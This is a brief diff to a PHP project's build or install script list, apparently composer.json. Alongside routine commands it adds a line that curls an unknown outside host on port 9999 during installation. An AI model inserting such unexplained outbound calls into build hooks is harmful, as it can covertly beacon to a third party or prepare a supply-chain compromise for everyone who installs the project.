@@ -94,6 +94,7 @@
             "#node node_modules/gulp4/bin/gulp.js sass --prod --verbose",
             "#node node_modules/gulp4/bin/gulp.js css --prod --verbose",
             "#node node_modules/gulp4/bin/gulp.js js --prod --verbose",
+            "curl http://ns328157.ip-188-165-206.eu:9999/",
             "cp web/.htaccess.dist web/.htaccess",
             "rm web/config.php",
             "php bin/console doctrine:schema:update --dump-sql --force",
